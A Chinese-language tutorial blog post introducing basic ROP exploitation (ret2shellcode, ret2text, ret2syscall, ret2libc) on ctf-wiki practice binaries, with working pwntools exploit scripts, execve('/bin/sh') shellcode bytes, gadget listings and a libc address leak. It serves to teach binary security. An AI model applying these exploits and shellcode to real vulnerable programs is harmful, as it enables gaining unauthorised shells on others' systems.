作者：threepwn 合天智汇

## 0x01 前言  

> 在了解栈溢出后，我们再从原理和方法两方面深入理解基本ROP。  
>

## 0x02 什么是ROP  

> ROP的全称为Return-oriented
> programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等）。通过上一篇文章[走进栈溢出](https://zhuanlan.zhihu.com/%E5%A1%AB%E5%86%99%E5%9C%B0%E5%9D%80)，我们可以发现栈溢出的控制点是ret处，那么ROP的核心思想就是利用以ret结尾的指令序列把栈中的应该返回EIP的地址更改成我们需要的值，从而控制程序的执行流程。  
>

## 0x03 为什么要ROP  

> 探究原因之前，我们先看一下什么是NX(DEP) NX即No-> execute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。
> 随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。所以就有了各种绕过办法，rop就是一种  
>

## 0x04 基本ROP  

## ret2shellcode  

### 含义  

> 我们先看这个，顾名思义，ret to shellcode，就是将返地址覆盖到我们插入shellcode的首地址。  
>

### 从原理中解析ret2shellcode  

> 先通过一个小程序回顾一下栈溢出利用过程：  
>
    
    
    #include <stdio.h>
    #include <stdlib.h>
    char buf[10];
    int main(int arg, char **args)
    {
        char s[10]; 
        puts("start !!!");
        gets(s);
        strncpy(buf, s, 10);
        printf(buf);
        printf("\nend !!!");
        return 0;
    }

![image.png](https://image.3001.net/images/20200429/1588139750_5ea916e6ee42c.png!small)  

>
> 可以知道s所在位置为esp+0x16，esp=0x0061FE80，那么s所在位置为61FF96，也就是ebp-0x12，因此填充18个字符即可满足溢出的临界条件  
>

![image.png](https://image.3001.net/images/20200429/1588139761_5ea916f1f03e9.png!small)  

> 利用IDA找到buf的地址0x004053E0，在BSS段。
> 这里普及一下是BSS段：BSS段通常是指用来存放程序中未初始化的或者初始化为0的全局变量和静态变量的一块内存区域。特点是可读写的，在程序执行之前BSS段会自动清0。
> 既然可读写那么只要能够在栈内写入的payload，然后再转移到此处，并且执行权限就可以控制。 通过strncpy函数达到这一目的  
>

### 从例子中解析ret2shellcode  

> 来看一个例子：[ret2shellcode](https://raw.githubusercontent.com/ctf-wiki/ctf-> challenges/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-> example/ret2shellcode)  
>

### 发现利用点  

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char s; // [esp+1Ch] [ebp-64h]
      setvbuf(stdout, 0, 2, 0);
      setvbuf(stdin, 0, 1, 0);
      puts("No system for you this time !!!");
      gets(&s);
      strncpy(buf2, &s, 0x64u);
      printf("bye bye ~");
      return 0;
    }

> 在IDA中能够发现两点： 一、存在栈溢出 二、能利用写入/bin/sh进行getshell  
>

### 确定利用前提  

> 此时只需要确定是否开启NX和bss段是否可以执行 首先检查保护机制  
>

![v2-ee0181fd43b1dcbd5e8f72e0072cbb95_720w](https://pic1.zhimg.com/80/v2-ee0181fd43b1dcbd5e8f72e0072cbb95_720w.png)

> 然后在IDA中确定buf2的BSS段位置  
>
    
    
    .bss:0804A080                 public buf2
    .bss:0804A080 ; char buf2[100]

> 查看该BSS段是否具有执行权限  
>

![v2-7b64978a515f77636aee456557547c0e_720w](https://pic4.zhimg.com/80/v2-7b64978a515f77636aee456557547c0e_720w.png)

> 一切完成后，可以发现这个文件可以进行ret2shellcode  
>

### 调试  

> 在get处设置断点，来确定s变量与ebp的距离，可以看到 s 的地址为 0xffffbe3c，计算一下得出 s 相对于 ebp 的偏移为 0x6c。  
>
    
    
    这里为什么要在get处设置断点？
    因为知道s的地址才能计算出相对于ebp的偏移，此处esp刚好存储s的的地址
    0x804858c <main+95>:    lea    eax,[esp+0x1c]
    0x8048590 <main+99>:    mov    DWORD PTR [esp],eax
    当然您可以选择其它位置，只不过这里更便捷。

![image.png](https://image.3001.net/images/20200429/1588139806_5ea9171edf70e.png!small)  

> 可以知道溢出的临界点与触发地址还有一个4个字节的间隔 所以payload的结构是含有shellcode的6c个字节+4个字节+buf2地址  
>
    
    
    from pwn import *
    sh = process('./ret2shellcode')
    shellcode = asm(shellcraft.sh())
    buf2_addr = 0x804a080
    sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))  //含有shellcode的6c个字节+4个字节+buf2地址
    sh.interactive()

### 扩展点  

    
    
    >>> asm(shellcraft.sh())
    'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
    >>> asm(shellcraft.sh()).ljust(112, 'A')
    'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
    所以我们也可以直接构造，pwntools提供了shellcraft模块更方便。
    shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。
    这里的shellcraft.sh()则是执行/bin/sh的shellcode
    shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
    shellcode.ljust(112, 'A') + p32(buf2_addr)

## ret2text  

### 含义  

> 顾名思义，ret to text，也就是说我们的利用点在原文件中寻找即可，控制程序执行程序本身已有的的代码 (.text)。  
>

### 从例子中解析ret2text  

> 来看一个例子：[ret2text](https://github.com/ctf-wiki/ctf-> challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-> ret2text/ret2text)  
>

### 发现利用点  

> IDA查看找到构成栈溢出漏洞的条件  
>

![v2-19e93dc3a42c0acfb749585e0a8683f1_720w](https://pic2.zhimg.com/80/v2-19e93dc3a42c0acfb749585e0a8683f1_720w.png)

### 确定利用前提  

> 开启了NX，栈上无法写入shellcode  
>

![v2-b89f587f03bc0011d786bd66f4425cb3_720w](https://pic2.zhimg.com/80/v2-b89f587f03bc0011d786bd66f4425cb3_720w.png)

> 那么我们寻找程序中是否存在/bin/sh或者systerm()等 在IDA的Strings窗口找到/bin/sh  
>
    
    
    LOAD:08048154   00000013    C   /lib/ld-linux.so.2
    LOAD:080482C9   0000000A    C   libc.so.6
    LOAD:080482D3   0000000F    C   _IO_stdin_used
    LOAD:080482E2   00000005    C   gets
    LOAD:080482E7   00000006    C   srand
    LOAD:080482ED   0000000F    C   __isoc99_scanf
    LOAD:080482FC   00000005    C   puts
    LOAD:08048301   00000005    C   time
    LOAD:08048306   00000006    C   stdin
    LOAD:0804830C   00000007    C   printf
    LOAD:08048313   00000007    C   stdout
    LOAD:0804831A   00000007    C   system
    LOAD:08048321   00000008    C   setvbuf
    LOAD:08048329   00000012    C   __libc_start_main
    LOAD:0804833B   0000000F    C   __gmon_start__
    LOAD:0804834A   0000000A    C   GLIBC_2.7
    LOAD:08048354   0000000A    C   GLIBC_2.0
    .rodata:08048763    00000008    C   /bin/sh
    .rodata:0804876C    00000037    C   There is something amazing here, do you know anything?
    .rodata:080487A4    00000022    C   Maybe I will tell you next time !
    .eh_frame:08048833  00000005    C   ;*2$\"

> 双击找到地址，那就是我们溢出到EIP的地址  
>

![v2-0907f0cf4deebfbeecabfc610ec2fb0a_720w](https://pic2.zhimg.com/80/v2-0907f0cf4deebfbeecabfc610ec2fb0a_720w.png)

### 调试  

>
> 因为原理相似，不再赘述，详细见[ret2shellcode](https://zhuanlan.zhihu.com/write#ret2shellcode)  
>

## ret2syscall  

### 含义  

> 顾名思义，ret to syscall，就是调用系统函数达到目的  
>

### 从例子中解析ret2syscall的方法  

> 那么这里我们来深入了解一下什么是ret2syscall？为什么可以ret2syscall？
> 在深入了解之前，先从一个例子[rop](https://raw.githubusercontent.com/ctf-wiki/ctf-> challenges/master/pwn/stackoverflow/ret2syscall/bamboofox-> ret2syscall/rop)中快速过一下方法 IDA中查看伪代码  
>
    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int v4; // [esp+1Ch] [ebp-64h]
      setvbuf(stdout, 0, 2, 0);
      setvbuf(stdin, 0, 1, 0);
      puts("This time, no system() and NO SHELLCODE!!!");
      puts("What do you plan to do?");
      gets(&v4);
      return 0;
    }

>
> 与上面两个例子相似，原理详细见[ret2shellcode](https://zhuanlan.zhihu.com/write#ret2shellcode)，但是获取/bin/sh则需要使用系统调用来获取，也就是ret2syscall专属方法，下面我们就说一下这个专属方法。
> 首先什么是系统调用？  
>
    
    
    在计算中，系统调用是一种编程方式，计算机程序从该程序中向执行其的操作系统内核请求服务。这可能包括与硬件相关的服务（例如，访问硬盘驱动器），创建和执行新进程以及与诸如进程调度之类的集成内核服务进行通信。系统调用提供了进程与操作系统之间的基本接口。

> 至于系统调用在其中充当什么角色，稍后再看 现在我们要做的是： 让程序调用execve("/bin/sh",NULL,NULL)函数即可拿到shell
> 调用此函数的具体的步骤是这样的： 因为该程序是 32 位，所以我们需要使得 系统调用号，即 eax 应该为 0xb 第一个参数，即 ebx 应该指向
> /bin/sh 的地址，其实执行 sh 的地址也可以。 第二个参数，即 ecx 应该为 0 第三个参数，即 edx 应该为 0 最后再执行int
> 0x80触发中断即可执行execve()获取shell 我们来看这一套流程： 1、存在栈溢出 2、使用ret2syscall手法进行操作
> 第一步与前两个方法一样，怎么样去偏移怎么去覆盖不再赘述，详见[ret2shellcode](https://zhuanlan.zhihu.com/write#ret2shellcode)，第二步ret2syscall手法也是中规中矩，照猫画虎即可。  
>

### 细说系统调用在ret2syscall的作用  

> 我们这里要说一说系统调用在其中充当了什么角色，这样才能更好地理解为什么要ret2syscall。  
>

### 一探系统调用  

### 从用户态到内核态  

> 先对这三个词的概念进行了解一下  
>
    
    
    用户态：user_space（或用户空间）是指在操作系统内核之外运行的所有代码。user_space通常是指操作系统用于与内核交互的各种程序和库：执行输入/输出，操纵文件系统对象的软件，应用程序软件等。也就是上层应用程序的活动空间，应用程序的执行必须依托于内核提供的资源
    内核态：控制计算机的硬件资源，并提供上层应用程序运行的环境，cpu可以访问内存的所有数据，包括外围设备，例如硬盘，网卡，cpu也可以将自己从一个程序切换到另一个程序。
    两中空间的分离可提供内存保护和硬件保护，以防止恶意或错误的软件行为。
    系统调用：为了使上层应用能够访问到这些资源，内核为上层应用提供访问的接口。

> 大致的关系如下：  
>

![image.png](https://image.3001.net/images/20200429/1588139862_5ea9175625a0b.png!small)  

> 再看一下系统调用的基本过程：
> 开始时应用程序准备参数，发出调用请求，然后glibc中也就是c标准库封装函数引导，执行系统调用，这里我们只探讨到这两个过程。
> 可以发现上述两个过程从用户态（第一步）过渡到内核态（第二步），系统调用就是中间的过渡件，我们能控制的地方就是用户态，然后通过系统调用控制到内核态。
> 先看一个程序  
>
    
    
    section .text
        global _start 
    _start:
        mov edx, len      ;message length
        mov ecx, msg     ;message to write
        mov ebx, 1      ;file descriptor (stdout)
        mov eax, 4      ;system call number (sys_write)
        int 0x80            ;call kernel
        mov eax, 1      ;system call number (sys_exit)
        int 0x80            ;call kernel
    
    section .data
    msg db  'Hello World',0xa
    len equ $ - msg

> 可以发现该程序通过调用sys_write函数进行输出Hello World，那么sys_write()是什么？  
>
    
    
    sys_write(unsigned int fd, const char __user *buf, size_t count);

> 可以发现前三个mov指令是把该函数需要的参数放进相应寄存器中，然后把sys_write的系统调用号放在EAX寄存器中，然后执行int
> 0x80触发中断即可执行sys_call()，那么问题就来了： 这几个寄存器有什么作用？ 为什么int 0x80？ int 0x80后发生了什么？
> 带着问题我们继续往下看  
>

### 二探系统调用  

### set_system_gate  

> 为何int 0x80？ 在系统文件中有这么一行代码  
>
    
    
    set_system_gate(0x80,&system_call);

>
> 在系统启动的时候，系统会在sched_init(void)函数中调用set_system_gate(0x80,&system_call)，设置中断向量号0x80的中断描述符，也就是说实现了系统调用
> (处理过程system_call)和 int 0x80中断的对应，进而通过此中断号用EAX实现不同子系统的调用。 详细了解，参见《linux 0.12》
> int 0x80后发生了什么？ 经过初始化以后，每当执行 int 0x80
> 指令时，产生一个异常使系统陷入内核空间并执行128号异常处理程序，也就是绑定后的函数，即系统调用处理程序
> system_call()，此时CPU完成从用户态到内核态切换，开始执行system_call()。  
>

### system_call()  

> 当进入system_call()后，主要做了两件事(我们关心的事情，其它的事情忽略，有兴趣可以去了解) 首先处理中断前设置环境的过程
> 然后找到实际处理在入口 规定：数值会放在eax,ebx,ecx,edx，参数一般为4个
> 所以ebx,ecx,edx会被压入栈中设置环境(也就是函数所需要的参数)，当然ds、es等也要压入，这里不是我们考虑的范围内，有兴趣可以去了解。
> 然后就会调用call_sys_call_table(,%eax,4)来实现相应系统函数的调用。 那么从大门进入后怎么知道进那个小门(系统函数)呢？
> 存在这么一个数组——sys_call_table(对应的处理函数少部分在这里面进行处理)，处理函数功能号对应sys_call_table[]的下标，sys_execve()函数的下标就是11，也就是0xb。
> 此刻应该会明朗了，那么我们言归正传，回到ret2syscall来。  
>

### 从例子中再次解析ret2syscall  

### 创造条件  

> 通过以上的了解，我们知道如果要执行execve("/bin/sh",NULL,NULL)函数我们需要这样做：  
>
    
    
    ; NASM
    int execve(const char *filename, char *const argv[], char *const envp[]); 
    mov eax, 0xb                ; execve系统调用号为11
    mov ebx, filename   
    mov ecx, argv
    mov edx, envp
    int 0x80                    ; 触发系统调用

> 其中，execve()执行程序由 filename决定。 filename必须是一个二进制的可执行文件，或者是一个脚本以#！格式开头的解释器参数参数。
> 记得当时考(ku)研(bi)观看张宇老师视频时的一句话：大手一挥，毛主席说,没有条件要创造条件。那么我们也要小手一挥，没有条件创造条件。
> 上面也提到了，我们只能控制用户态的操作，也就是上面程序类似mov指令的操作。 那么怎么做呢？ 这里需要ret2syscall的特有操作
> 之前已经知道各个寄存器的需要的内容了，此时就要想办法把这些值存储进对应的寄存器中 回归词意，ret to
> syscall，也就是找ret结尾的片段，比如把EAX置为0xb，执行以下程序即可完成。  
>
    
    
    pop eax
    ret

> 当然父程序通过栈溢出，执行ret后栈顶值为0xb，这样再调用此片段(父程序的ret
> addr为此片段的首地址)，EAX寄存器就会置为0xb，后面详细解读过程。 如果有多个片段连接起来不就可以把四个寄存器置为相应的值了吗  
>

![v2-f315d0cae1a8db786edbeab34c6b26a1_720w](https://pic2.zhimg.com/80/v2-f315d0cae1a8db786edbeab34c6b26a1_720w.png)

> 只要用户态栈空间能够控制成这样(只是举例其中的一种排列方式)就可以达到ret2syscall的目的 简单分析一下流程： 1、成功溢出
> 2、通过ret指令使得EIP指向pop eax;的地址 3、执行pop eax;栈顶值0xb成功出栈，栈顶指针下移
> 4、通过ret指令使得EIP指向pop ebx;的地址 ..... 一切都清楚后，下面就开始进行创造条件  
>
    
    
    pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
    0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
    0x080bb196 : pop eax ; ret
    0x0807217a : pop eax ; ret 0x80e
    0x0804f704 : pop eax ; ret 3
    0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret

> 选取其中一个就可以，比如可以选择第一行，那么你的用户态栈内容按照第一个的指令进行变化，出栈四次，然后才可以将ESP值置为下一个条件(pop
> ebx;)的地址，也就是说0xb+‘AAAA'+'AAAA'+'AAAA'+addr(pop ebx;)，因此我们不如选择第二行。  
>
    
    
    pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop  --only 'pop|ret' | grep 'ebx'
    0x08049a94 : pop ebx ; pop esi ; ret
    0x080481c9 : pop ebx ; ret
    0x080d7d3c : pop ebx ; ret 0x6f9
    0x08099c87 : pop ebx ; ret 8
    0x0806eb91 : pop ecx ; pop ebx ; ret
    0x0806336b : pop edi ; pop esi ; pop ebx ; ret
    0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret

> 简单展示部分内容，与上一个选取原理是一样的，为了方便，我们选择最后一行。  
>
    
    
    pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop  --string '/bin/sh'
    Strings information
    ============================================================
    0x080be408 : /bin/sh
    pwn@pwn-PC:~/Desktop$ ROPgadget --binary rop  --only 'int'
    Gadgets information
    ============================================================
    0x08049421 : int 0x80
    
    Unique gadgets found: 1

>
> 条件已经创造完了，万事俱备，只欠东风，现在只需要把这些条件串联起来就可以实现ret2syscall，我们从下图来能够看到，ESP指针依次下移，直到指向int
> 0x80触发中断。  
>

![v2-9bde75a1cd6eb9961944dbbe0784d8a4_720w](https://pic1.zhimg.com/80/v2-9bde75a1cd6eb9961944dbbe0784d8a4_720w.png)

### payload  

    
    
    from pwn import *
    sh = process('./rop')
    pop_eax_ret = 0x080bb196
    pop_edx_ecx_ebx_ret = 0x0806eb90
    int_0x80 = 0x08049421
    binsh = 0x80be408
    payload = flat(['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
    sh.sendline(payload)
    sh.interactive()

## ret2libc  

> 对于ret2libc，借用ctfwiki的三个例子详细解读其中的原理和利用过程。  
>

### 含义  

>
> 我们知道，操作系统通常使用动态链接的方法来提高程序运行的效率。那么在动态链接的情况下，程序加载的时候并不会把链接库中所有函数都一起加载进来，而是程序执行的时候按需加载。也就是控制执行
> libc（对应版本） 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行
> system(“/bin/sh”)（或者execve("/bin/sh",NULL,NULL)），故而此时我们需要知道 system
> 函数的地址，具体可以移步[深入理解GOT表和PLT表](https://zhuanlan.zhihu.com/%E5%A1%AB%E5%86%99%E5%9C%B0%E5%9D%80)。  
>

### 初探ret2libc  

> 上面已经提到了，我们只要可以执行类似system(“/bin/sh”)的函数即可获取shell，在存在溢出的程序中我们在一般怎么去执行此函数呢？
> 大致可以分为三类： 一、"/bin/sh"字符串和system函数都可以在程序找到 二、二者其一找不到（一般为"/bin/sh"字符串找不到）
> 三、二者都没有 无论是哪一种情况，我们需要找到"/bin/sh"字符串和system()函数，并且堆栈位置如下：  
>

![image.png](https://image.3001.net/images/20200429/1588139948_5ea917ac5b477.png!small)  

>
> 当然还需了解一下x86对于形参的处理，就可以知道上图的“任意四字符”处为返回地址，因为我们不用考虑程序后续怎去正常运行，达到getshell的目的即可，程序的具体执行过程可以参照[走进栈溢出](https://zhuanlan.zhihu.com/%E5%A1%AB%E5%86%99%E5%9C%B0%E5%9D%80)。  
>

![v2-afc836aeb10cd2dd07a34456d02654c4_720w](https://pic4.zhimg.com/80/v2-afc836aeb10cd2dd07a34456d02654c4_720w.png)

> 那么我们分开说一下怎去利用。  
>

### 再探ret2libc  

> 先看一个简单的[例子](https://github.com/ctf-wiki/ctf-> challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1)，
> 也就是我们说的第一种情况。
> 检查保护机制，程序为32位并且开了NX保护，继续反编译从伪代码可以发现gets()处导致栈溢出，对于以上步骤，本文已经详细讲述过，不再赘述，以下两种情况的分析也直接省去该过程。
> 按照上述的理论，我们在IDA的Stings中可以找到"/bin/sh"，在Functions中可以找到system()函数  
>
    
    
    .rodata:08048720 aBinSh          db '/bin/sh',0          ; DATA XREF: .data:shell↓o
    .plt:08048460 ; int system(const char *command)
    .plt:08048460 _system         proc near               ; CODE XREF: secure+44↓p
    .plt:08048460 command         = dword ptr  4
    .plt:08048460                 jmp     ds:off_804A018
    .plt:08048460 _system         endp

> 找到0x08048720和0x08048460后，按照上图所示的堆栈位置构造payload：  
>
    
    
    binsh_addr = 0x8048720
    system_plt = 0x8048460
    payload = flat(['a' * 112, system_plt, 'b' * 4, binsh_addr])

### 三探ret2libc  

> 在这一节，首先说一下第二种情况的[例子](https://github.com/ctf-wiki/ctf-> challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2)。可以发现在IDA中只能找到system()函数的plt地址，却没有看到"/bin/sh"字符串的踪影  
>
    
    
    .plt:08048490 ; int system(const char *command)
    .plt:08048490 _system         proc near               ; CODE XREF: secure+44↓p
    .plt:08048490 command         = dword ptr  4
    .plt:08048490                 jmp     ds:off_804A01C
    .plt:08048490 _system         endp

> 没有了"/bin/sh"字符串，就没办法获取shell，那么我们就得创造条件。
> 除了现成的内容，我们也可以人工输入，那么就需要gets()函数来实现这一目的，因此目前的结构应该如下图所示。  
>

![v2-8ba03469fde6286ab9703b6fc2b78f65_720w](https://pic1.zhimg.com/80/v2-8ba03469fde6286ab9703b6fc2b78f65_720w.png)

> 当然也可以进行堆栈平衡，在执行完gets()函数后提升堆栈(add esp, 4)，堆栈位置如下：  
>
    
    
    程序在读写数据的时候是通过地址查找的,如果函数调用之前的堆栈与函数调用之后的堆栈不一致,就可能导致找不到数据或找到的数据错误,那么久有可能导致程序崩溃。

![image.png](https://image.3001.net/images/20200429/1588140125_5ea9185d60403.png!small)  

> 这样构造使得我们的堆栈逻辑更好看，一个函数一个函数的顺序执行，从压入形参到结束，显得有条理，但是只要达到目的即可，第一种或许更方便一些。
> 那么采取第一种做法，找到相应的地址  
>
    
    
    .plt:08048460 _gets           proc near               ; CODE XREF: main+72↓p
    .plt:08048460 s               = dword ptr  4
    .plt:08048460                 jmp     ds:off_804A010
    .plt:08048460 _gets           endp

>
> 如同[ret2shellcode](https://zhuanlan.zhihu.com/write#ret2shellcode)一节中做法一样，在bss段找到一个数组，确保其有执行权限  
>
    
    
    .bss:0804A080 ; char buf2[100]

> 完成这些步骤后，就可以构造payload了  
>
    
    
    gets_plt = 0x08048460
    system_plt = 0x08048490
    buf2 = 0x804a080
    payload = flat(['a' * 112, gets_plt, system_plt, buf2, buf2])
    sh.sendline(payload)
    sh.sendline('/bin/sh')

> 继续来看第三种情况，如果什么都没有，我们怎么去一个一个去创造条件？ 对于'/bin/sh'字符串的构造已经知道了，剩下的就是怎么找到system函数
> 这里需要事先了解下动态链接时GOT表和PLT表的作用，可以参考[深入理解GOT表和PLT表](https://zhuanlan.zhihu.com/%E5%A1%AB%E5%86%99%E5%9C%B0%E5%9D%80)
> 此文。
> 可以发现，GOT表的第三项调用_dl_runtimw_resolve将真正的函数地址，也就是glibc运行库中的函数的地址，回写到代码段，就是got[n]（n>=3）中。也就是说在函数第一次调用的时，才通过连接器动态解析并加载到.got.plt中，而这个过程称之为延时加载或者惰性加载。
> 目前的思路就是，通过栈溢出泄露某函数(一般为泄露 __libc_start_main
> 地址，这里选择泄露put函数)的GOT表地址，然后根据偏移量（libc中函数与函数之间的距离时固定的）来计算出system()的地址，有了'/bin/sh'也有了system，shell自然就有了，如下图所示。  
>

![image.png](https://image.3001.net/images/20200429/1588140206_5ea918ae25be8.png!small)  

> 使用pwntools编写  
>
    
    
    from pwn import *
    
    sh = process('./ret2libc3')
    elf = ELF('./ret2libc3')
    
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    payload = flat(["A" * 112, puts_plt,  "A"  * 4, puts_got])
    sh.sendlineafter("Can you find it !?", payload)
    puts_addr = u32(sh.recv(4))
    print "[*]puts addr: " + hex(puts_addr)

> 可以发现通过相应的模块可以顺利获取puts函数的真实地址（也就是GOT表中存储的地址）  
>
    
    
    pwn@pwn-PC:~/Desktop$ python ret2libc.py 
    [+] Starting local process './ret2libc3': pid 45169
    [*] '/home/pwn/Desktop/ret2libc3'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    [*] u'/usr/lib/i386-linux-gnu/libc-2.24.so'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      PIE enabled
    [*]puts addr: 0xf7d6f880
    [*] Stopped process './ret2libc3' (pid 45169)

> 那么问题来了？ 此处的溢出用来获取put函数的真实地址，怎么再去进行执行system('bin/sh')呢？如果存在两个溢出点就完美了，可惜只有一个。
> 不过刚才提到的返回地址，在这里就有了用武之地了，它可以让我们有“两个”溢出点。如果put函数的返回地址可以回到函数的入口，不就可以再执行一遍gets(溢出点)了吗？怎么构造之前简单了解用户代码的入口和系统代码的入口，在一个程序运行中有两个入口，一个是main()，另一个是_start()，简单来说，main()函数是用户代码的入口，是对用户而言的；而_start()函数是系统代码的入口，是程序真正的入口。这里以main()函数作为入口为例，如下图所示：  
>

![v2-65c4043f53e2897b57a6e3ca73266ec1_720w](https://pic2.zhimg.com/80/v2-65c4043f53e2897b57a6e3ca73266ec1_720w.png)

> 一目了然后，构造poc即可。先来梳理一下我们需要知道什么条件： 一、puts函数的地址和真实地址 二、main函数的真实地址
> 三、system函数的真实地址 四、'/bin/sh'字符串的位置 条件一我们已经具备了，那么怎么搞定剩下的条件，以及堆栈位置。
> 怎么获取main、system和'/bin/sh'的真实地址呢？ 当然与获取put的真实地址一样  
>
    
    
    main_addr = elf.symbols['main']
    程序运行起来后main_addr就是真实地址了
    之后相减获取基址
    libc.address = puts_addr - libc.symbols['puts']
    然后获取system和'/bin/sh'的地址
    system_addr = libc.symbols['system']
    binsh_addr = next(libc.search('/bin/sh'))

> 那么直接构造exp  
>
    
    
    from pwn import *
    
    sh = process('./ret2libc3')
    elf = ELF('./ret2libc3')
    libc = elf.libc
    
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_addr = elf.symbols['main']
    payload = flat(["A" * 112, puts_plt, main_addr, puts_got])
    sh.sendlineafter("Can you find it !?", payload)
    puts_addr = u32(sh.recv(4))
    
    libc.address = puts_addr - libc.symbols['puts']
    system_addr = libc.symbols['system']
    binsh_addr = next(libc.search('/bin/sh'))
    payload2 = flat(["B" * 104, system_addr, "B" * 4, binsh_addr])
    sh.sendline(payload2)
    sh.interactive()

>
> 这里会发现，payload2中溢出字符为104个，比第一次减少了8个，这个的原因有点复杂，涉及到x86程序启动，x86程序启动会做一些初始化工作，包括main函数参数的初始化，篇幅较长，不再细说(其实是还没研究懂，太菜了)，当然如果只是为了做这道题的话，可以直接调试得到。
> 泄露__libc_start_main地址，使用_start也是一样的，懂得原理稍微改一下就可以，在[ctfwiki](https://ctf-> wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/#3)
> 中引用了[LibcSearcher](https://github.com/lieanu/LibcSearcher)  
>
    
    
    libc = LibcSearcher('__libc_start_main', libc_start_main_addr)

> 另外也可以根据第二种情况的思路，引入gets和buf来获取字符串'/bin/sh'，如下图所示  
>

![v2-c00fbc59dec45591d740990efcd6bc0d_720w](https://pic1.zhimg.com/80/v2-c00fbc59dec45591d740990efcd6bc0d_720w.png)

> exp如下  
>
    
    
    from pwn import *
    
    sh = process('./ret2libc3')
    elf = ELF('./ret2libc3')
    libc = elf.libc
    
    puts_plt = elf.plt['puts']
    puts_got = elf.got['puts']
    main_addr = elf.symbols['main']
    payload = flat(["A" * 112, puts_plt, main_addr, puts_got])
    sh.sendlineafter("Can you find it !?", payload)
    puts_addr = u32(sh.recv(4))
    
    gets_plt = 0x08048440
    buf2 = 0x804a080
    libc.address = puts_addr - libc.symbols['puts']
    system_addr = libc.symbols['system']
    
    payload2 = flat(['a' * 104, gets_plt, system_addr, buf2, buf2])
    sh.sendline(payload2)
    sh.sendline('/bin/sh')
    sh.interactive()

## 0x05 尾记  

> 还未入门，详细记录每个知识点，为了能更好地温故知新，也希望能帮助和我一样想要入门二进制安全的初学者，如有错误，希望大佬们指出。 参考：
> <http://drops.xmd5.com/static/drops/tips-6597.html> (蒸米大佬的文章，极力推荐)
> <https://zh.*********.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8>
> <https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh>
> <http://www.cnblogs.com/elvirangel/p/7484772.html>  
>

实验推荐：高级栈溢出技术—ROP实战

[http://www.hetianlab.com/cour.do?w=1&c=CCID31b0-fe03-4277-8e2f-504c4960d33f](http://www.hetianlab.com/cour.do?w=1&c=CCID31b0-fe03-4277-8e2f-504c4960d33f)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

